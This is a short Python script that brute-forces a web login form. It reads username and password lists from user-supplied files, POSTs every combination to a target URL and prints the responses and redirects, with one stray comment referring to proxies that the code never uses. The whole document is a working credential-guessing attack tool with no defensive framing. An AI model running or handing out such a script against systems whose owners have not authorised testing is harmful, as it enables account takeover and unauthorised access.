import requests
import time
import sys
def s_print(text, speed=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
admin_el = []
psd = []
i = 0
a_url = input("Testing URL: ")
# read the list of proxies from the file

admin_list_file = input("Admin list path: ")
with open(admin_list_file,'r') as admin_list_file :
    for line in admin_list_file:
        admin_el.append(line.strip())

password_list_file = input("Password list path: ")
with open(password_list_file, 'r') as f:
    psd = [line.strip() for line in f]

for admin in admin_el:
    for password in psd:
        s_print("\nTrying: {} with password {}".format(admin, password))
        params = {
                'user_name': admin,
                'user_pass': password
        }
        try:
            response = requests.post(a_url, params=params, allow_redirects=True)
            if response.status_code == 200:
                s_print('\nREQUEST-POSTED!\n=== The fetched response is: \n')
                print(response.content)
            elif response.status_code in [301, 302]:
                s_print('\nRedirection detected!\n=== The fetched response is: \n')
                print(response.headers['Location'])
            else:
                 s_print('Error while sending request!\n=== Details of Failure ===\n')
                 print(response.status_code)
        except requests.exceptions.RequestException:
                s_print('Failed to make request')
               # print(requests.exception.RequestException)
        time.sleep(1)
 
